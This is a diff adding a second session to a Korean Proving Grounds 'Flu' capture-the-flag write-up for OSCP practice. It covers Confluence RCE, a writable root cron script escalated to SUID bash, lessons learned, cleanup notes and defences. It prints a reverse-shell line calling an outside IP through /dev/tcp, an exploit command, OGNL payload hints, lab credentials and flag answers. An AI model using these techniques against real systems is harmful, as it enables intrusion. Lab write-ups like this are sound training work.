+| `proof.txt` | `/root/proof.txt` | `2caa37b3c096709c688b69556c3c6cf7` | root cron 이 도는 쓰기 가능 스크립트 → SUID bash |
+
+> [!danger] PG 는 리버트할 때마다 플래그 값을 새로 만든다
+> 2차 세션에서 읽은 `local.txt` 는 `52791694c2a6ccde2db0f566f81d084f` 로 **1차 세션의 값과 다르다.**
+> 1차 값은 그 인스턴스에서 이미 제출돼 유효했고, 지금 다시 넣으면 거부된다.
+> **함의: 플래그를 적어 두고 나중에 제출하려는 계획은 리버트 한 번에 무효가 된다.** 읽으면 그 세션 안에 넣어라.
+
+> [!warning] `--read-file /root/proof.txt` 가 실패한 진짜 이유 — 초고의 설명이 틀렸다
+> 초고는 *"`/root/proof.txt` 는 통상 `0600 root:root` 다"* 라고 적었다. **실측은 `-rw-r--r--`(0644) 다.** 파일 자체는 누구나 읽을 수 있는 모드다.
+> 막은 것은 **디렉터리**다 — `/root` 가 `drwx------ root root` 라서 `confluence` 는 그 안으로 **경로 탐색 자체가 안 된다**(§4-1 의 `ls: cannot open directory '/root': Permission denied`).
+> 결론(권한 경계를 못 넘는다)은 같지만 **이유가 다르고, 그 차이가 실무적으로 중요하다**: 파일 모드만 보고 "읽을 수 있겠네"라고 판단하면 안 된다. **경로 위의 모든 디렉터리에 `x` 권한이 있어야 파일에 닿는다.**
 
 ---
 
 ## 6. 막혔던 지점 / 시행착오
 
 > [!abstract] 이 장의 출처
-> 아래 ①~⑥은 **Kali `~/.zsh_history` 에서 회수한 실제 명령**이다. 원본 노트에는 성공 경로만 적혀 있었다.
+> ①~⑨는 1차 세션(2026-07-14)의 것이고, **Kali `~/.zsh_history` 에서 회수한 실제 명령**이다. 원본 노트에는 성공 경로만 적혀 있었다.
 > 오류 문구는 **Kali에서 직접 재현해 확인**했다(② ③ 제외 — 그 둘은 재현 방법을 각 항목에 명시했다).
+> ⑩~⑫는 2차 세션(2026-08-20)의 것이고 `~/PG/Flu/privesc_session.log` 에서 나왔다.
 
 ### ① `searchsploit` 이 7.13.6을 못 찾았다 — 그런데 답은 있었다
 
@@ -714,6 +981,8 @@ python through_the_wire.py --rhost 192.168.103.41 --rport 8090 --lhost 192.168.4
 > 그래서 **"이 익스플로잇은 파일 읽기가 불안정한가 보다"** 로 오독하기 쉽다. 실제 의미는 **"권한이 없다 = 권한상승이 필요하다"** 였다.
 >
 > **판별법**: 읽을 수 있는 게 확실한 파일로 대조군을 세운다. `/etc/passwd` 가 오면 프리미티브는 멀쩡한 것이고, 그 상태에서 목표 파일만 안 오면 **원인은 권한 하나로 좁혀진다.**
+>
+> 2차 세션에서 정확한 이유가 밝혀졌다 — `/root/proof.txt` 자체는 `0644` 다. 막은 것은 **`/root` 디렉터리의 `0700`** 이다. §5 의 마지막 콜아웃 참조.
 
 ### ④ `-rport` — 대시 하나가 빠졌다
 
@@ -794,14 +1063,22 @@ mv 51904.py ./PG/Flu        ← 후반, 셸을 잡은 뒤
 
 ### ⑦ 시간 배분 — 어디서 손절했어야 하는가
 
-| 구간 | 실제 | 시험이라면 |
+| 구간 | 1차 세션 (2026-07-14) | 2차 세션 (2026-08-20) |
 |---|---|---|
-| nmap `-p-` | 13:51–13:53 (129초) | 그대로 좋다 |
-| 버전 판정 → 익스플로잇 확보 | 13:53–14:06 (~13분) | 좋다 |
-| Foothold | 14:06–14:20 (~14분) | 좋다 |
-| **권한상승** | **사실상 0분** | **여기에 60분을 배정했어야 한다** |
+| nmap `-p-` | 13:51–13:53 (129초) | 13:48–13:50, 결과 동일 |
+| 버전 판정 → 익스플로잇 확보 | 13:53–14:06 (~13분) | 0분 (1차의 클론 재사용) |
+| Foothold | 14:06–14:20 (~14분) | ~1분 (같은 명령, IP 만 교체) |
+| **권한상승** | **사실상 0분 — 미완** | **04:50–04:54 UTC, 약 5분** |
 
-**Foothold까지 30분은 훌륭했다.** 실패는 속도가 아니라 **배분**이다. 웹 익스플로잇을 더 찾는 데 쓴 시간을 로컬 열거에 썼어야 했다.
+**Foothold까지 30분은 훌륭했다.** 1차의 실패는 속도가 아니라 **배분**이었다 — 웹 익스플로잇을 더 찾는 데 쓴 시간을 로컬 열거에 썼어야 했다.
+
+2차 세션의 권한상승이 5분에 끝난 것은 운이 아니라 **순서** 덕이다. 반사 명령 5개를 **한 줄로 묶어** 한 번에 치고(§4-1), 전부 빈손인 것을 확인한 즉시 `find / -writable` 로 넘어갔다. 도구를 하나도 올리지 않았다.
+
+> [!tip] 시험용 시간 배분으로 옮기면
+> - foothold 60분 · 권한상승 60분 · 총 120분에서 손절
+> - 권한상승 첫 **5분**은 §4-1 의 한 줄짜리 반사 명령에 쓴다. 여기서 끝나는 박스가 실제로 많다
+> - 다섯 개가 다 빈손이면 **다음 10분은 `find / -writable`·`find / -user root -perm -o+w`·`ps aux`·`ss -lntup`** 이다
+> - 그래도 없으면 그때 `linpeas` 를 올린다. **순서를 뒤집지 마라** — linpeas 출력 2000줄을 읽는 것보다 `id` 한 줄이 빠르다
 
 ### ⑧ 리버스셸이 안 붙었다면 무엇을 의심했을까 (이 박스에서는 한 번에 붙었다)
 
@@ -839,6 +1116,71 @@ mv 51904.py ./PG/Flu        ← 후반, 셸을 잡은 뒤
 
 **포트 80이 아예 없다** — 웹 열거의 습관대로 `feroxbuster` 를 80에 돌리려다 없다는 것을 확인하는 데 시간을 쓸 수 있다. `-p-` 결과를 먼저 읽자.
 
+### ⑩ OS 를 SSH 배너로 추정했다가 틀렸다
+
+1차 세션 노트는 상단 요약에 *"Linux (Ubuntu, OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 → 22.04 계열)"* 이라고 적었다. 2차 세션의 `uname -a` 와 `/etc/os-release` 가 반증했다 — **Ubuntu 23.04, kernel 6.2.0-39-generic** 이다.
+
+사실 배너에 답이 이미 있었는데 못 읽은 것이다. Launchpad 에 질의해 확인했다:
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ for s in jammy lunar; do echo "== $s"; curl -s "https://api.launchpad.net/1.0/ubuntu/+archive/primary?ws.op=getPublishedSources&source_name=openssh&exact_match=true&distro_series=https://api.launchpad.net/1.0/ubuntu/$s&status=Published" | python3 -c 'import sys,json; d=json.load(sys.stdin); [print(e["source_package_version"], e["pocket"]) for e in d["entries"][:6]]'; done
+== jammy
+1:8.9p1-3ubuntu0.16 Updates
+1:8.9p1-3ubuntu0.16 Security
+1:8.9p1-3 Release
+== lunar
+1:9.0p1-1ubuntu8.7 Updates
+1:9.0p1-1ubuntu8.7 Security
+1:9.0p1-1ubuntu8 Release
+```
+
+**22.04(jammy)는 8.9p1-3ubuntu0.x 이고, 23.04(lunar)가 9.0p1-1ubuntu8.x 다.** 타겟 배너 `9.0p1 Ubuntu 1ubuntu8.5` 는 lunar 계열과 **패키지 리비전까지 정확히 맞는다.** 즉 배너만으로도 23.04 를 특정할 수 있었는데, "9.x 니까 요즘 LTS 겠지"로 건너뛴 것이다.
+
+**교훈은 릴리스 번호를 외우라는 게 아니다.** 배너의 데비안 리비전(`-3ubuntu0.16` / `-1ubuntu8.5`)은 릴리스마다 고유하므로 **조회하면 답이 나온다**는 것이다. 그리고 셸이 있으면 조회할 필요조차 없다 — `uname -a` 다.
+
+nmap 의 OS 추정도 마찬가지로 빗나갔다 — `Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5` 라고 했는데 실제는 6.2 다. 열린 포트가 3개뿐이라 지문 표본이 빈약했다.
+
+> [!tip] 커널 익스플로잇을 고려한다면 이 오차가 치명적이다
+> 5.x 로 알고 5.x 용 PoC 를 골랐으면 그냥 실패한다. **셸을 잡은 뒤에는 추정을 버리고 `uname -a` 로 확정하라.** 1초짜리 명령이다.
+> 여기서는 어차피 6.2.0-39(2023-11) 가 당시 최신에 가까워 커널 경로를 팔 이유가 없었다. Ubuntu 23.04 + 6.2 를 보면 GameOver(lay)(CVE-2023-2640/CVE-2023-32629)가 먼저 떠오르지만, 그 패치는 6.2.0-26 에 들어갔으므로 **-39 는 이미 지나 있다.** [가정] — 실제로 시도해 보지는 않았다. 아래 ⑪ 의 경로가 먼저 나왔다.
+
+### ⑪ 표준 열거 5종이 전부 공백이었다 — 그때가 방향을 바꿀 시점이다
+
+`id`(그룹 없음) · `sudo -l`(비밀번호 요구) · SUID(전부 기본) · `getcap`(전부 기본) · 크론(`/etc/cron*` 기본, 개인 crontab 없음). **다섯 개가 연달아 빈손이었다.**
+
+여기서 하기 쉬운 선택 두 가지가 다 나쁘다:
+
+1. **커널 익스플로잇으로 도망간다** — 위 ⑩ 처럼 버전 추정이 틀리면 시간만 태운다. 그리고 PG 박스가 커널 0-day 를 요구하는 경우는 드물다
+2. **같은 열거를 도구를 바꿔 반복한다**(linpeas 를 올린다) — 나쁘지 않지만, 이 박스에서는 **손으로 친 `find / -writable` 한 줄이 답이었다.** 도구를 올리는 데 드는 시간(다운로드·전송·실행·출력 읽기)이 더 길었을 것이다
+
+실제로 통한 것은 **질문을 바꾸는 것**이었다. "나에게 무슨 권한이 있는가"(`id`·`sudo -l`·SUID·capabilities)를 다섯 번 물어 다 빈손이었으면, 다음 질문은 **"내가 건드릴 수 있는 *남의* 것이 무엇인가"** 다. 그게 `find / -writable` 이고, `find / -group $(id -gn)` 이고, `find / -user root -perm -o+w` 다.
+
+> [!tip] 이 전환의 일반형
+> | 1라운드 질문 | 2라운드 질문 |
+> |---|---|
+> | 나는 무엇을 실행할 수 있나 (`sudo -l`·SUID·capabilities) | 나는 **무엇을 쓸 수 있나** (`find / -writable`) |
+> | 나는 어느 그룹인가 (`id`) | **누가 내 것을 실행하나** (root cron·systemd·서비스 유닛) |
+> | 어떤 크론이 보이나 (`/etc/cron*`) | 크론이 **안 보이는데도** 도는 증거가 있나 (`pspy`, 남의 홈에 쓰는 내 소유 스크립트, mtime 이 방금인 파일) |
+>
+> Flu 는 2라운드 첫 줄에서 끝났다. **1라운드가 다섯 번 빈손이면 그건 실패가 아니라 신호다.**
+
+### ⑫ 크론이 "없다"고 결론 낼 뻔했다
+
+§4-1 에서 `/etc/crontab`·`/etc/cron.d/`·`/etc/cron.hourly/` 를 다 봤고 `crontab -l` 은 `no crontab for confluence` 였다. **관측만 놓고 보면 "이 박스에 사용자 크론은 없다"** 가 자연스러운 결론이다.
+
+틀렸다. root 개인 crontab 에 `*/1 * * * * /opt/log-backup.sh` 가 있었다(§4-4). `/var/spool/cron/crontabs` 는 `drwx-wx--T` 라 **저권한 사용자는 목록조차 못 본다.**
+
+> [!danger] 저권한에서 크론은 원리적으로 부분 관측이다
+> 볼 수 있는 것: `/etc/crontab`, `/etc/cron.d/*`, `/etc/cron.{hourly,daily,weekly,monthly}/*`, **자기 자신의** `crontab -l`
+> 볼 수 없는 것: **다른 사용자의 개인 crontab 전부**, systemd 타이머의 일부 유닛 내용
+>
+> 그래서 "크론 없음"은 **결론이 아니라 관측 한계**다. 간접 증거로 넘어가야 한다:
+> - `ls -la --time-style=full-iso` 로 **mtime 이 방금인 파일** — 뭔가 주기적으로 돈다는 뜻이다
+> - `pspy` 로 프로세스 생성 감시 (root 권한 없이도 `/proc` 폴링으로 잡는다)
+> - **남의 디렉터리에 쓰는데 내가 소유한 스크립트** ← 이 박스의 답
+> - `/var/log/syslog` 의 `CRON[...]` 줄 (읽을 수 있다면)
+
 ---
 
 ## 7. OSCP 시험 관점
@@ -854,7 +1196,14 @@ mv 51904.py ./PG/Flu        ← 후반, 셸을 잡은 뒤
 9. **익스플로잇이 주는 권한 = 서비스 실행 계정.** 셸을 잡은 순간 `id` 부터 친다. 웹 익스플로잇을 하나 더 찾고 있다면 방향이 틀린 것이다.
 10. **셸을 잡자마자 칠 5개**: `id` · `sudo -l` · `find / -perm -4000 -type f 2>/dev/null` · `getcap -r / 2>/dev/null` · `cat /etc/crontab`
 11. **자동 도구 없이 같은 결과를 얻는 법** — 이 박스는 자동 익스플로잇 도구를 쓰지 않았다. PoC 스크립트는 시험 허용이고, 굳이 손으로 하려면 `curl --path-as-is` 로 URL 인코딩한 OGNL 페이로드를 경로에 붙여 보내면 된다(닫는 `/` 를 잊지 말 것).
-12. **`local.txt` 를 얻었다고 박스가 끝난 게 아니다.** 이 노트가 그 증거다 — 프론트매터는 `solved` 라고 적혀 있지만 **실제로는 1/2** 다.
+12. **`local.txt` 를 얻었다고 박스가 끝난 게 아니다.** 1차 세션은 여기서 멈춰 **1/2** 로 남았다. 시험이라면 절반 점수다.
+13. **반사 5종이 다 비면 질문을 바꾼다.** "내가 무엇을 할 수 있나" → **"내가 무엇을 쓸 수 있나"**. `find / -writable -not -path ...` 한 줄이 이 박스의 답이었다(§6-⑪).
+14. **남의 디렉터리에 쓰는 스크립트는 그 사용자로 실행된다.** `BACKUP_DIR="/root/backup"` 한 줄이 "root cron" 이라는 뜻이다. 실행 주체를 코드에서 역산하라.
+15. **`/etc/cron*` 이 비어도 크론이 없는 게 아니다.** 다른 사용자의 개인 crontab 은 `0600`, 스풀 디렉터리는 `drwx-wx--T` 라 **원리적으로 안 보인다**(§6-⑫).
+16. **SUID 셸을 만들면 `-p` 를 붙여 실행하라.** bash 는 `euid != uid` 를 감지하면 스스로 특권을 버린다. `-p` 가 없으면 SUID 가 붙어 있어도 평범한 셸이 나온다.
+17. **파일 모드만 보고 읽을 수 있다고 판단하지 마라.** 이 박스의 `/root/proof.txt` 는 `0644` 였는데도 못 읽었다 — 막은 것은 `/root` 디렉터리의 `0700` 이다. **경로 위 모든 디렉터리에 `x` 가 필요하다.**
+18. **셸을 잡으면 추정을 실측으로 교체하라.** SSH 배너로 22.04 라고 추정했던 것이 실제로는 23.04 였고, nmap 의 커널 추정 5.x 는 실제 6.2 였다. `uname -a` 한 줄이면 끝난다(§6-⑩).
+19. **PG 는 리버트마다 플래그 값을 새로 만든다.** 적어 두고 나중에 제출할 계획은 리버트 한 번에 무효가 된다.
 
 ---
 
@@ -865,6 +1214,13 @@ mv 51904.py ./PG/Flu        ← 후반, 셸을 잡은 뒤
 - **아웃바운드 이그레스 필터링** — 이 익스플로잇은 타겟이 **밖으로 TCP를 열어야** 성립한다(리버스셸이든 파일 읽기든). 서버가 임의 목적지로 나가지 못하게 막으면 RCE가 나도 데이터가 안 빠진다.
 - **관리 인터페이스를 인터넷에 두지 않기** — 8090을 VPN/내부망 뒤에 두었으면 미인증 결함의 노출면 자체가 없다.
 - **탐지** — 액세스 로그의 URI에 `%24%7B`(= `${`) 나 `Class.forName` 이 보이면 그대로 침해 지표다. 경로 세그먼트가 비정상적으로 긴 요청도 마찬가지다.
+
+**권한상승 쪽은 원인이 하나다 — 파일 소유권이다.**
+
+- `/opt/log-backup.sh` 가 **`confluence:confluence` 소유였다.** root cron 이 실행하는 스크립트를 저권한 계정이 쓸 수 있으면 그 자체로 root 다. `root:root 0755` 였으면 이 경로는 존재하지 않는다. **"root 가 실행하는 것은 root 만 쓸 수 있어야 한다"** 가 규칙이다.
+- 스크립트 안의 변수도 전부 **따옴표가 없다**(`cp -r $LOG_DIR $BACKUP_DIR/...`). 이 박스에서는 경로에 공백이 없어 문제가 안 됐지만, 로그 파일명을 공격자가 정할 수 있으면 별개의 주입면이 된다.
+- **`sudo -l` 을 비밀번호 뒤에 둔 것은 잘 한 설정이다.** 서비스 계정에 `NOPASSWD` 를 주면 여기서 바로 끝났다.
+- **Confluence DB 비밀번호가 평문**으로 `confluence.cfg.xml` 에 있다. Atlassian 설계상 불가피한 면이 있지만, **그 비밀번호를 OS 계정과 공유하지 않는 것**이 최소한의 방어다. 이 박스는 그 점은 지켰다 — `HoldingOn12` 는 DB 전용이었다.
 
 ---
 
@@ -882,18 +1238,32 @@ mv 51904.py ./PG/Flu        ← 후반, 셸을 잡은 뒤
 
 ## 남긴 흔적 (랩 정리용)
 
-- **리버스셸 프로세스** — `confluence` 사용자로 `bash -i` 가 남았다. 타겟이 정지돼 정리 여부를 재확인하지 못했다. [가정] 리버트로 소멸.
-- **파일 업로드 없음** — 이 박스에는 도구를 올리지 않았다(그게 §6-⑥의 문제이기도 하다). 타겟 파일시스템에 쓴 것이 없다.
-- **획득 자격증명** — 없음. 이 박스는 자격증명 없이 CVE만으로 뚫렸다.
-- **미완** — `proof.txt`. 다음 세션의 첫 수는 **셸 재획득 후 `id`** 다.
+**되돌린 것 — 실행 결과로 확인함:**
+
+- `/opt/log-backup.sh` — 페이로드 한 줄을 붙였다가 **원본(`/tmp/.lb.orig` 백업)으로 복원했다.** 복원 후 `tail -3` 이 원본 마지막 줄(`find $BACKUP_DIR ... \;`)로 끝나는 것을 확인했다.
+- `/tmp/rootbash` (SUID bash) — **삭제 확인.** 복원 뒤 `ls -la /tmp/` 에 없다.
+- `/tmp/.lb.orig` (백업본) — **삭제 확인.** 같은 `ls` 출력에 없다.
+- Kali `tmux` 세션 `flunmap` — `tmux kill-session -t flunmap` 으로 종료 확인.
+
+**남아 있는 것:**
+
+- **리버스셸 프로세스** — `confluence` 로 `bash -c bash -i >& /dev/tcp/192.168.45.207/1270` 와 그 자식들. 여기서 root 셸까지 올라갔으므로 프로세스 트리가 살아 있다. **총괄이 플래그를 재확인해야 해서 의도적으로 살려 뒀다.** 확인 후 종료 예정이며, 리버트하면 소멸한다.
+- **Kali `tmux` 세션 `flushell`** — 위 셸을 담고 있다. 같은 이유로 남겼다.
+- `/root/backup/log_backup_*` — 이건 **박스 자신의 크론이 1분마다 만드는 것**이지 내가 만든 것이 아니다. 스크립트의 `-mmin +5` 가 알아서 지운다.
+
+**획득 자격증명** — Confluence DB: `confluence` / `HoldingOn12` (MySQL, localhost 전용). Confluence 웹 admin 해시 `{PKCS5S2}MCB0MaBA39Gj...` — 크랙하지 않았다.
+
+**타겟에 업로드한 파일 없음.** linpeas 를 포함해 어떤 도구도 올리지 않았다. 쓴 것은 위 두 개(`/tmp/rootbash`·`/tmp/.lb.orig`)뿐이고 둘 다 지웠다.
 
 ## 관련 노트
 
 - [[_WRITEUP-STANDARD]] — 이 노트의 작성 기준
-- [[_STATUS]] — 이 박스는 **부분 완료(1/2)** 로 등재돼 있다
+- [[_STATUS]] — 2026-08-20 부로 **완료(2/2)**
+- [[Astronaut]] · [[Exfiltrated]] · [[Muddy]] · [[Zipper]] — 같은 권한상승 유형(**크론이 도는 스크립트/경로를 저권한이 건드린다**). Flu 는 그중 가장 단순한 형태다 — 스크립트 파일 자체를 쓸 수 있었다
 - [[Clue]] — **같은 계열의 교훈이 가장 많은 박스.** 공개 PoC를 손으로 고쳐 쓰는 법, 리버스셸 `lhost` 오지정, exploit 헤더의 거짓 주석
 - [[plum]] — 누적 패턴 **"익스플로잇 전에 버전 범위를 대조하라"**. 이 박스의 §6-⑤와 같은 실패
 - [[Squid]] · [[Exfiltrated]] · [[Hawat]] — 누적 패턴 "인용이 깨지면 인코딩으로 도망간다". §2-3의 `bash -c` 래핑이 같은 계열
 - [[Crane]] · [[RubyDome]] · [[Astronaut]] · [[Exghost]] · [[Squid]] — 누적 패턴 "응답이 성공을 뜻하지 않는다". §2-4·§6-③은 그 **거울상**(무응답도 실패를 뜻하지 않는다)
 - [[Hub]] · [[Levram]] — 누적 패턴 "버전 판정은 독립 근거 2개". §1-2가 그 실행
 - [[Butch]] — ⚠️ 웹셸로 얻은 플래그는 OSCP에서 0점. 증거 스크린샷 형식
+- [[Jacko]] — Flu 가 오래 머물렀던 **부분 완료(1/2)** 상태에 여전히 있는 박스. Windows 쪽에서 공개 익스플로잇으로 Foothold 를 잡고 `proof.txt` 를 못 얻었다. 그쪽 §6 은 "리버스셸이 안 붙을 때 무엇부터 의심하는가"가 주제다
